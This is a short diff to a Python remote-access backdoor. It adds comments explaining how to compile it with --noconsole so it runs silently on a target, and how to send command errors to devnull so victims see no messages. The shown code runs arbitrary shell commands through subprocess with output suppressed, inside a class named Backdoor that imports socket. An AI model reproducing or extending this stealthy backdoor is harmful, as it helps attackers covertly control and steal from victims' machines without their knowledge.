@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 #needs debugging to work in python3 - bytes-like object error
-#compile with --noconsole arg, see line 22
+#compile with --noconsole arg to run silently on target, see line 22
 
 import base64, json, os, socket, subprocess, sys
 
@@ -20,6 +20,7 @@ class Backdoor:
     def execute_system_command(self, command):
         try:
             DEVNULL = open(os.devnull, 'wb') #DEVNULL var equals a stream - points to devnull location, OS-agnostic
+            #redirecting output to devnull prevents err msgs from displaying on target
             #return subprocess.check_output(command, shell=True)
             return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
             #redirect stderr and std input to devnull
